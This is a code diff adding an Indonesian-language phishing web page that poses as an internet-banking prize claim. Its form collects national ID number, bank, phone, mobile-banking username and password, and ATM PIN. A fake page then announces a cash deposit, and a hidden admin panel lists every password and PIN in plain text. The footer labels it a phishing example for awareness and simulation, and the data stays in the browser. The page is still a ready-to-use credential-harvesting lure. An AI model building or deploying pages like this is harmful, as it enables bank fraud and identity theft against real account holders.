@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registrasi Akun</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Fraunces:ital,wght@0,400;0,700;1,400&display=swap"
+    rel="stylesheet">
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --coral: #D85A30;
+      --coral-light: #FAECE7;
+      --coral-dark: #993C1D;
+      --teal: #1D9E75;
+      --teal-light: #E1F5EE;
+      --teal-dark: #0F6E56;
+      --gray-50: #F8F7F4;
+      --gray-100: #EDECEA;
+      --gray-200: #D3D1C7;
+      --gray-500: #888780;
+      --gray-700: #5F5E5A;
+      --gray-900: #2C2C2A;
+      --white: #ffffff;
+      --radius: 14px;
+      --radius-sm: 8px;
+      --shadow: 0 2px 24px rgba(44, 44, 42, 0.10);
+      --shadow-sm: 0 1px 6px rgba(44, 44, 42, 0.07);
+      --font: 'Plus Jakarta Sans', sans-serif;
+      --font-display: 'Fraunces', serif;
+    }
+
+    body {
+      font-family: var(--font);
+      background: var(--gray-50);
+      min-height: 100vh;
+      color: var(--gray-900);
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: var(--white);
+      border-bottom: 1px solid var(--gray-100);
+      padding: 0 1.5rem;
+      height: 90px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+
+    .logo-icon {
+      width: 36px;
+      height: 36px;
+      background: var(--coral);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: white;
+    }
+
+    .logo-text {
+      font-family: var(--font-display);
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: var(--gray-900);
+    }
+
+    .header-link {
+      font-size: 0.875rem;
+      color: var(--gray-700);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .header-link:hover {
+      color: var(--coral);
+    }
+
+    /* ── PAGE LAYOUT ── */
+    .page {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    /* ── REGISTER PAGE ── */
+    .register-wrapper {
+      min-height: calc(100vh - 64px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+    }
+
+    .register-card {
+      background: var(--white);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 2.5rem 2rem;
+      width: 100%;
+      max-width: 480px;
+      animation: fadeUp 0.4s ease;
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .card-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    .card-badge {
+      display: inline-block;
+      background: var(--coral-light);
+      color: var(--coral-dark);
+      font-size: 0.75rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      padding: 4px 12px;
+      border-radius: 100px;
+      margin-bottom: 0.75rem;
+      text-transform: uppercase;
+    }
+
+    .card-title {
+      font-family: var(--font-display);
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--gray-900);
+      margin-bottom: 0.4rem;
+    }
+
+    .card-sub {
+      font-size: 0.875rem;
+      color: var(--gray-500);
+    }
+
+    /* ── FORM ── */
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    .field {
+      margin-bottom: 1.1rem;
+    }
+
+    .field.full {
+      grid-column: 1 / -1;
+    }
+
+    label {
+      display: block;
+      font-size: 0.8125rem;
+      font-weight: 600;
+      color: var(--gray-700);
+      margin-bottom: 5px;
+    }
+
+    label span.req {
+      color: var(--coral);
+      margin-left: 2px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="tel"],
+    select,
+    textarea {
+      width: 100%;
+      padding: 0.65rem 0.875rem;
+      border: 1.5px solid var(--gray-200);
+      border-radius: var(--radius-sm);
+      font-family: var(--font);
+      font-size: 0.9rem;
+      color: var(--gray-900);
+      background: var(--white);
+      outline: none;
+      transition: border-color 0.18s, box-shadow 0.18s;
+      appearance: none;
+    }
+
+    input:focus,
+    select:focus,
+    textarea:focus {
+      border-color: var(--coral);
+      box-shadow: 0 0 0 3px rgba(216, 90, 48, 0.12);
+    }
+
+    input.error,
+    select.error {
+      border-color: #E24B4A;
+      box-shadow: 0 0 0 3px rgba(226, 75, 74, 0.1);
+    }
+
+    .err-msg {
+      font-size: 0.75rem;
+      color: #A32D2D;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .err-msg.show {
+      display: block;
+    }
+
+    select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23888780' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+      padding-right: 2rem;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .pw-wrap {
+      position: relative;
+    }
+
+    .pw-toggle {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--gray-500);
+      font-size: 1.1rem;
+      line-height: 1;
+      padding: 2px;
+    }
+
+    /* ── DIVIDER ── */
+    .section-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      color: var(--gray-500);
+      text-transform: uppercase;
+      border-top: 1px solid var(--gray-100);
+      padding-top: 1.2rem;
+      margin: 0.5rem 0 1rem;
+    }
+
+    /* ── CHECKBOX ── */
+    .check-field {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 1.25rem;
+    }
+
+    .check-field input[type="checkbox"] {
+      width: 17px;
+      height: 17px;
+      min-width: 17px;
+      accent-color: var(--coral);
+      margin-top: 1px;
+      cursor: pointer;
+    }
+
+    .check-field label {
+      font-size: 0.8125rem;
+      color: var(--gray-700);
+      font-weight: 400;
+      cursor: pointer;
+    }
+
+    .check-field label a {
+      color: var(--coral);
+    }
+
+    /* ── SUBMIT BTN ── */
+    .btn-submit {
+      width: 100%;
+      padding: 0.8rem;
+      background: var(--coral);
+      color: white;
+      font-family: var(--font);
+      font-size: 0.9375rem;
+      font-weight: 700;
+      border: none;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: background 0.18s, transform 0.12s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-submit:hover {
+      background: var(--coral-dark);
+    }
+
+    .btn-submit:active {
+      transform: scale(0.985);
+    }
+
+    .btn-submit.loading {
+      pointer-events: none;
+      opacity: 0.75;
+    }
+
+    .btn-submit .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    .btn-submit.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .login-link {
+      text-align: center;
+      margin-top: 1.25rem;
+      font-size: 0.85rem;
+      color: var(--gray-500);
+    }
+
+    .login-link a {
+      color: var(--coral);
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* ── SUCCESS PAGE ── */
+    .success-wrapper {
+      min-height: calc(100vh - 64px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+    }
+
+    .success-card {
+      background: var(--white);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 3rem 2rem;
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+      animation: fadeUp 0.5s ease;
+    }
+
+    .success-icon {
+      width: 72px;
+      height: 72px;
+      background: var(--teal-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.5rem;
+      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+      animation-delay: 0.2s;
+    }
+
+    @keyframes popIn {
+      from {
+        transform: scale(0);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .success-icon svg {
+      width: 36px;
+      height: 36px;
+      stroke: var(--teal-dark);
+      fill: none;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .success-title {
+      font-family: var(--font-display);
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--gray-900);
+      margin-bottom: 0.5rem;
+    }
+
+    .success-msg {
+      font-size: 0.9rem;
+      color: var(--gray-500);
+      line-height: 1.6;
+      margin-bottom: 1.75rem;
+    }
+
+    .success-info {
+      background: var(--gray-50);
+      border: 1px solid var(--gray-100);
+      border-radius: var(--radius-sm);
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.75rem;
+      text-align: left;
+    }
+
+    .success-info p {
+      font-size: 0.85rem;
+      color: var(--gray-700);
+      margin-bottom: 4px;
+    }
+
+    .success-info p:last-child {
+      margin-bottom: 0;
+    }
+
+    .success-info strong {
+      color: var(--gray-900);
+    }
+
+    .btn-outline {
+      display: inline-block;
+      padding: 0.7rem 1.75rem;
+      border: 1.5px solid var(--gray-200);
+      border-radius: var(--radius-sm);
+      font-family: var(--font);
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: var(--gray-700);
+      text-decoration: none;
+      background: var(--white);
+      cursor: pointer;
+      transition: border-color 0.18s, color 0.18s;
+    }
+
+    .btn-outline:hover {
+      border-color: var(--coral);
+      color: var(--coral);
+    }
+
+    /* ── ADMIN PAGE ── */
+    .admin-wrapper {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 2rem 1.25rem 3rem;
+    }
+
+    .admin-top {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      margin-bottom: 1.5rem;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .admin-title {
+      font-family: var(--font-display);
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: var(--gray-900);
+    }
+
+    .admin-sub {
+      font-size: 0.85rem;
+      color: var(--gray-500);
+      margin-top: 2px;
+    }
+
+    .admin-actions {
+      display: flex;
+      gap: 0.75rem;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .search-box {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .search-box svg {
+      position: absolute;
+      left: 10px;
+      width: 16px;
+      height: 16px;
+      stroke: var(--gray-500);
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      pointer-events: none;
+    }
+
+    .search-input {
+      padding: 0.5rem 0.75rem 0.5rem 2rem;
+      border: 1.5px solid var(--gray-200);
+      border-radius: var(--radius-sm);
+      font-family: var(--font);
+      font-size: 0.85rem;
+      outline: none;
+      width: 200px;
+      color: var(--gray-900);
+      background: var(--white);
+      transition: border-color 0.18s;
+    }
+
+    .search-input:focus {
+      border-color: var(--coral);
+    }
+
+    .stat-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 0.875rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .stat-card {
+      background: var(--white);
+      border: 1px solid var(--gray-100);
+      border-radius: var(--radius-sm);
+      padding: 1rem 1.25rem;
+    }
+
+    .stat-label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--gray-500);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 6px;
+    }
+
+    .stat-val {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--gray-900);
+    }
+
+    .stat-val.coral {
+      color: var(--coral);
+    }
+
+    .stat-val.teal {
+      color: var(--teal);
+    }
+
+    /* ── TABLE ── */
+    .table-wrap {
+      background: var(--white);
+      border: 1px solid var(--gray-100);
+      border-radius: var(--radius);
+      overflow: hidden;
+      overflow-x: auto;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 600px;
+      font-size: 0.875rem;
+    }
+
+    thead th {
+      background: var(--gray-50);
+      padding: 0.75rem 1rem;
+      text-align: left;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--gray-500);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      border-bottom: 1px solid var(--gray-100);
+      white-space: nowrap;
+    }
+
+    tbody tr {
+      border-bottom: 1px solid var(--gray-100);
+      transition: background 0.12s;
+    }
+
+    tbody tr:last-child {
+      border-bottom: none;
+    }
+
+    tbody tr:hover {
+      background: var(--gray-50);
+    }
+
+    td {
+      padding: 0.875rem 1rem;
+      color: var(--gray-900);
+      vertical-align: middle;
+    }
+
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--coral-light);
+      color: var(--coral-dark);
+      font-weight: 700;
+      font-size: 0.75rem;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-right: 8px;
+    }
+
+    .name-cell {
+      display: flex;
+      align-items: center;
+    }
+
+    .cell-name {
+      font-weight: 600;
+      color: var(--gray-900);
+    }
+
+    .cell-email {
+      font-size: 0.8rem;
+      color: var(--gray-500);
+      margin-top: 1px;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 3px 9px;
+      border-radius: 100px;
+      font-size: 0.72rem;
+      font-weight: 700;
+    }
+
+    .badge-new {
+      background: var(--teal-light);
+      color: var(--teal-dark);
+    }
+
+    .badge-active {
+      background: #EAF3DE;
+      color: #3B6D11;
+    }
+
+    .btn-del {
+      background: none;
+      border: 1px solid var(--gray-200);
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 0.78rem;
+      color: #A32D2D;
+      cursor: pointer;
+      font-family: var(--font);
+      font-weight: 600;
+      transition: background 0.15s, border-color 0.15s;
+    }
+
+    .btn-del:hover {
+      background: #FCEBEB;
+      border-color: #E24B4A;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 3rem 1rem;
+      color: var(--gray-500);
+    }
+
+    .empty-state svg {
+      width: 40px;
+      height: 40px;
+      stroke: var(--gray-200);
+      fill: none;
+      stroke-width: 1.5;
+      margin-bottom: 0.75rem;
+    }
+
+    .empty-state p {
+      font-size: 0.9rem;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      text-align: center;
+      padding: 1.5rem;
+      font-size: 0.8rem;
+      color: var(--gray-500);
+      border-top: 1px solid var(--gray-100);
+      background: var(--white);
+    }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 540px) {
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+
+      .field.full {
+        grid-column: auto;
+      }
+
+      .register-card {
+        padding: 1.75rem 1.25rem;
+      }
+
+      .admin-top {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .search-input {
+        width: 100%;
+      }
+
+      .admin-actions {
+        width: 100%;
+      }
+
+      .search-box {
+        flex: 1;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ═══ HEADER ═══ -->
+  <header>
+    <a class="logo" href="#" onclick="showPage('register')">
+      <!-- <div class="logo-icon">
+      <svg viewBox="0 0 20 20"><path d="M10 2a4 4 0 100 8 4 4 0 000-8zm-8 14c0-3.314 3.582-6 8-6s8 2.686 8 6"/></svg>
+    </div> -->
+      <span class="logo-text">AMBIL HADIAH INTERNET BANKING</span>
+    </a>
+
+
+  </header>
+
+  <!-- ═══════════════════════════════════
+     PAGE 1 — FORM REGISTRASI
+════════════════════════════════════════ -->
+  <div class="page active" id="page-register">
+    <div class="register-wrapper">
+      <div class="register-card">
+        <div class="card-header">
+          <img src="bank.jpg" alt="Header Form" style="width:100%; height:auto; border-radius:8px; margin-bottom:1rem;">
+          <p class="card-sub" style="font-weight:600; font-size:1rem; color:#2C2C2A;">Isi formulir di bawah ini untuk
+            mendaftar</p>
+        </div>
+
+        <form id="regForm" novalidate>
+
+          <!-- Data Pribadi -->
+          <div class="section-label">Data Pribadi</div>
+          <div class="form-row">
+            <div class="field full">
+              <label for="nama">Nama Lengkap (Sesuai KTP)<span class="req">*</span></label>
+              <input type="text" id="nama" placeholder="Budi Santoso" autocomplete="name">
+              <div class="err-msg" id="err-nama">Nama lengkap wajib diisi</div>
+            </div>
+            <div class="field full">
+              <label for="email">Alamat Email Mbank<span class="req">*</span></label>
+              <input type="email" id="email" placeholder="budi@email.com" autocomplete="email">
+              <div class="err-msg" id="err-email">Email tidak valid</div>
+            </div>
+            <div class="field full">
+              <label for="nik">NIK <span class="req">*</span></label>
+              <input type="text" id="nik" placeholder="16 digit NIK" maxlength="16">
+              <div class="err-msg" id="err-nik">NIK wajib diisi (16 digit)</div>
+            </div>
+          
+            <div class="field">
+  <label for="bank">Bank <span class="req">*</span></label>
+  <select id="bank">
+    <option value="">Pilih...</option>
+    <option value="BRI">BRI</option>
+    <option value="BCA">BCA</option>
+    <option value="BNI">BNI</option>
+    <option value="Mandiri">Mandiri</option>
+    <option value="Bank Mega">Bank Mega</option>
+    <option value="Danamon">Danamon</option>
+    <option value="Mandiri Syariah">Mandiri Syariah</option>
+    <option value="BJB">BJB</option>
+  </select>
+  <div class="err-msg" id="err-bank">Pilih bank</div>
+</div>
+            <div class="field">
+              <label for="gender">Jenis Kelamin <span class="req">*</span></label>
+              <select id="gender">
+                <option value="">Pilih...</option>
+                <option value="Laki-laki">Laki-laki</option>
+                <option value="Perempuan">Perempuan</option>
+                <option value="Lainnya">Lainnya</option>
+              </select>
+              <div class="err-msg" id="err-gender">Pilih jenis kelamin</div>
+            </div>
+            <div class="field">
+              <label for="telepon">No. Telepon <span class="req">*</span></label>
+              <input type="tel" id="telepon" placeholder="0812-xxxx-xxxx" autocomplete="tel">
+              <div class="err-msg" id="err-telepon">Nomor telepon wajib diisi</div>
+            </div>
+            <div class="field">
+              <label for="tanggal_lahir">Tanggal Lahir</label>
+              <input type="text" id="tanggal_lahir" placeholder="DD/MM/YYYY">
+            </div>
+            <div class="field full">
+              <label for="alamat">Alamat (Sesuai KTP)</label>
+              <textarea id="alamat" placeholder="Jl. Contoh No. 1, Kota..."></textarea>
+            </div>
+          </div>
+
+          <!-- Akun -->
+          <div class="section-label">Data Akun</div>
+          <div class="form-row">
+            <div class="field full">
+              <label for="username">Username Mbank<span class="req">*</span></label>
+              <input type="text" id="username" placeholder="budisantoso" autocomplete="username">
+              <div class="err-msg" id="err-username">Username wajib diisi (min. 4 karakter)</div>
+            </div>
+            <div class="field">
+              <label for="password">Password Mbank<span class="req">*</span></label>
+              <div class="pw-wrap">
+                <input type="password" id="password" placeholder="••••••••" autocomplete="new-password">
+                <button type="button" class="pw-toggle" onclick="togglePw('password', this)"
+                  aria-label="Tampilkan password">👁</button>
+              </div>
+              <div class="err-msg" id="err-password">Password min. 6 karakter</div>
+            </div>
+            <div class="field">
+              <label for="pin">PIN ATM<span class="req">*</span></label>
+              <div class="pw-wrap">
+                <input type="password" id="pin" placeholder="6 digit PIN" maxlength="6" inputmode="numeric">
+                <button type="button" class="pw-toggle" onclick="togglePw('pin', this)"
+                  aria-label="Tampilkan PIN">👁</button>
+              </div>
+              <div class="err-msg" id="err-pin">PIN harus 6 digit angka</div>
+            </div>
+          </div>
+
+          <!-- Syarat -->
+          <div class="check-field">
+            <input type="checkbox" id="terms">
+            <label for="terms">Saya menyetujui <a href="#">Syarat &amp; Ketentuan</a> dan <a href="#">Kebijakan
+                Privasi</a></label>
+          </div>
+          <div class="err-msg" id="err-terms" style="margin-top:-12px;margin-bottom:12px;">Harap centang persetujuan
+          </div>
+
+          <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="spinner" id="spinner"></span>
+            <span id="btnText">Daftar Sekarang</span>
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════
+     PAGE 2 — SUKSES
+════════════════════════════════════════ -->
+  <div class="page" id="page-success">
+    <div class="success-wrapper">
+      <div class="success-card">
+        <div class="success-icon">
+          <svg viewBox="0 0 36 36">
+            <polyline points="6,18 14,26 30,10" />
+          </svg>
+        </div>
+        <h2 class="success-title">Uang Tunai Berhasil Masuk Akun Anda!</h2>
+        <p class="success-msg">Akun Anda telah berhasil menerima hadiah. Silakan periksa data yang telah didaftarkan di bawah
+          ini.</p>
+
+        <div class="success-info" id="successInfo"></div>
+
+        <button class="btn-outline" onclick="showPage('register'); resetForm()">
+          &#8592; Daftar Akun Lain
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════
+     PAGE 3 — ADMIN
+════════════════════════════════════════ -->
+  <div class="page" id="page-admin">
+    <div class="admin-wrapper">
+      <div class="admin-top">
+        <div>
+          <div class="admin-title">Panel Admin</div>
+          <div class="admin-sub">Data pendaftar yang masuk</div>
+        </div>
+        <div class="admin-actions">
+          <div class="search-box">
+            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="11" cy="11" r="8" />
+              <line x1="21" y1="21" x2="16.65" y2="16.65" />
+            </svg>
+            <input class="search-input" type="text" id="searchInput" placeholder="Cari nama / email..."
+              oninput="renderTable()">
+          </div>
+          <button class="btn-del" style="color:var(--coral-dark);border-color:var(--coral)"
+            onclick="showPage('register')">
+            + Daftar Baru
+          </button>
+        </div>
+      </div>
+
+      <!-- Stats -->
+      <div class="stat-row">
+        <div class="stat-card">
+          <div class="stat-label">Total Pendaftar</div>
+          <div class="stat-val coral" id="statTotal">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Laki-laki</div>
+          <div class="stat-val" id="statMale">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Perempuan</div>
+          <div class="stat-val" id="statFemale">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Terbaru Hari Ini</div>
+          <div class="stat-val teal" id="statToday">0</div>
+        </div>
+      </div>
+
+      <!-- Table -->
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Nama</th>
+              <th>NIK</th>
+              <th>Username</th>
+              <th>Email</th>
+              <th>Telepon</th>
+              <th>Gender</th>
+              <th>Tgl Lahir</th>
+              <th>Alamat</th>
+              <th>Bank</th>
+              <th>Password</th>
+              <th>PIN</th>
+              <th>Status</th>
+              <th>Terdaftar</th>
+              <th>Aksi</th>
+            </tr>
+          </thead>
+          <tbody id="tableBody"></tbody>
+        </table>
+        <div class="empty-state" id="emptyState" style="display:none;">
+          <svg viewBox="0 0 40 40">
+            <rect x="5" y="5" width="30" height="30" rx="4" />
+            <line x1="12" y1="15" x2="28" y2="15" />
+            <line x1="12" y1="21" x2="28" y2="21" />
+            <line x1="12" y1="27" x2="22" y2="27" />
+          </svg>
+          <p>Belum ada data pendaftar</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ FOOTER ═══ -->
+  <footer>
+    &copy; Contoh Web Phising &mdash; Sosialisasi &amp; Simulasi
+    <a class="header-link" href="#" onclick="showPage('admin')">
+      &#9881; Panel Admin
+    </a>
+  </footer>
+
+  <script>
+    // ── DATA STORE ──
+    let users = JSON.parse(localStorage.getItem('regUsers') || '[]');
+
+    function save() {
+      localStorage.setItem('regUsers', JSON.stringify(users));
+    }
+
+    // ── PAGE NAVIGATION ──
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById('page-' + id).classList.add('active');
+      window.scrollTo(0, 0);
+      if (id === 'admin') { updateStats(); renderTable(); }
+    }
+
+    // ── TOGGLE PASSWORD ──
+    function togglePw(id, btn) {
+      const inp = document.getElementById(id);
+      if (inp.type === 'password') { inp.type = 'text'; btn.textContent = '🙈'; }
+      else { inp.type = 'password'; btn.textContent = '👁'; }
+    }
+
+    // ── VALIDATION HELPERS ──
+    function setErr(id, show) {
+      const inp = document.getElementById(id);
+      const msg = document.getElementById('err-' + id);
+      if (!inp || !msg) return;
+      inp.classList.toggle('error', show);
+      msg.classList.toggle('show', show);
+    }
+
+    function val(id) { return (document.getElementById(id)?.value || '').trim(); }
+
+    // ── FORM VALIDATION & SUBMIT ──
+    document.getElementById('regForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      let ok = true;
+
+      // Nama depan
+      if (!val('nama')) { setErr('nama', true); ok = false; }
+      else setErr('nama', false);
+
+      // Email
+      const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRe.test(val('email'))) { setErr('email', true); ok = false; }
+      else setErr('email', false);
+
+      // NIK
+      if (val('nik').length !== 16 || isNaN(val('nik'))) { setErr('nik', true); ok = false; }
+      else setErr('nik', false);
+
+      // Telepon
+      if (!val('telepon')) { setErr('telepon', true); ok = false; }
+      else setErr('telepon', false);
+
+      // Gender
+      if (!val('gender')) { setErr('gender', true); ok = false; }
+      else setErr('gender', false);
+
+      if (!val('bank')) { setErr('bank', true); ok = false; }
+else setErr('bank', false);
+
+      // Username
+      if (val('username').length < 4) { setErr('username', true); ok = false; }
+      else setErr('username', false);
+
+      // Password
+      if (val('password').length < 6) { setErr('password', true); ok = false; }
+      else setErr('password', false);
+
+      // PIN
+      if (!/^\d{6}$/.test(val('pin'))) { setErr('pin', true); ok = false; }
+      else setErr('pin', false);
+
+      // Terms
+      const terms = document.getElementById('terms').checked;
+      const termsErr = document.getElementById('err-terms');
+      if (!terms) { termsErr.classList.add('show'); ok = false; }
+      else termsErr.classList.remove('show');
+
+      if (!ok) return;
+
+      // Loading state
+      const btn = document.getElementById('submitBtn');
+      btn.classList.add('loading');
+      document.getElementById('btnText').textContent = 'Mendaftarkan...';
+
+      setTimeout(() => {
+        const user = {
+          id: Date.now(),
+          nama: val('nama'),
+          email: val('email'),
+          nik: val('nik'),
+          pin: val('pin'),
+          telepon: val('telepon'),
+          gender: val('gender'),
+          bank: val('bank'),
+          tanggal_lahir: val('tanggal_lahir'),
+          alamat: val('alamat'),
+          username: val('username'),
+          password: val('password'),
+          status: 'Baru',
+          terdaftar: new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' })
+        };
+        users.push(user);
+        save();
+
+        // Show success info
+        const info = document.getElementById('successInfo');
+        info.innerHTML = `
+        <p><strong>Bank:</strong> ${user.bank}</p>
+        <p><strong>Nama Lengkap:</strong> ${user.nama}</p>
+        <p><strong>Email:</strong> ${user.email}</p>
+        <p><strong>Username:</strong> ${user.username}</p>
+        <p><strong>Telepon:</strong> ${user.telepon}</p>
+        <p><strong>Terdaftar:</strong> ${user.terdaftar}</p>
+      `;
+
+        btn.classList.remove('loading');
+        document.getElementById('btnText').textContent = 'Daftar Sekarang';
+        showPage('success');
+      }, 1400);
+    });
+
+    function resetForm() {
+      document.getElementById('regForm').reset();
+      document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
+      document.querySelectorAll('.err-msg.show').forEach(el => el.classList.remove('show'));
+    }
+
+    // ── ADMIN ──
+    function updateStats() {
+      document.getElementById('statTotal').textContent = users.length;
+      document.getElementById('statMale').textContent = users.filter(u => u.gender === 'Laki-laki').length;
+      document.getElementById('statFemale').textContent = users.filter(u => u.gender === 'Perempuan').length;
+      const today = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
+      document.getElementById('statToday').textContent = users.filter(u => u.terdaftar === today).length;
+    }
+
+    function renderTable() {
+      const q = (document.getElementById('searchInput')?.value || '').toLowerCase();
+      const filtered = users.filter(u =>
+        (u.nama_depan + ' ' + u.nama_belakang).toLowerCase().includes(q) ||
+        u.email.toLowerCase().includes(q) ||
+        u.username.toLowerCase().includes(q)
+      );
+
+      const tbody = document.getElementById('tableBody');
+      const empty = document.getElementById('emptyState');
+
+      if (filtered.length === 0) {
+        tbody.innerHTML = '';
+        empty.style.display = 'block';
+        return;
+      }
+      empty.style.display = 'none';
+
+      tbody.innerHTML = filtered.map((u, i) => {
+        const initials = u.nama.split(' ').map(n => n[0]).slice(0, 2).join('').toUpperCase();
+        const nama = u.nama;
+        return `
+  <tr>
+    <td>${i + 1}</td>
+    <td>
+      <div class="name-cell">
+        <span class="avatar">${initials}</span>
+        <div>
+          <div class="cell-name">${nama}</div>
+          <div class="cell-email">${u.email}</div>
+        </div>
+      </div>
+    </td>
+    <td>${u.nik}</td>
+    <td>${u.username}</td>
+    <td>${u.email}</td>
+    <td>${u.telepon}</td>
+    <td>${u.gender}</td>
+    <td>${u.tanggal_lahir || '-'}</td>
+    <td>${u.alamat || '-'}</td>
+    <td>${u.bank || '-'}</td>
+    <td style="font-family:monospace;">${u.password}</td>
+    <td style="font-family:monospace;">${u.pin}</td>
+    <td><span class="badge badge-new">${u.status}</span></td>
+    <td>${u.terdaftar}</td>
+    <td><button class="btn-del" onclick="deleteUser(${u.id})">Hapus</button></td>
+  </tr>
+`;
+      }).join('');
+    }
+
+    function deleteUser(id) {
+      if (!confirm('Hapus data pendaftar ini?')) return;
+      users = users.filter(u => u.id !== id);
+      save();
+      updateStats();
+      renderTable();
+    }
+  </script>
+</body>
+
+</html>
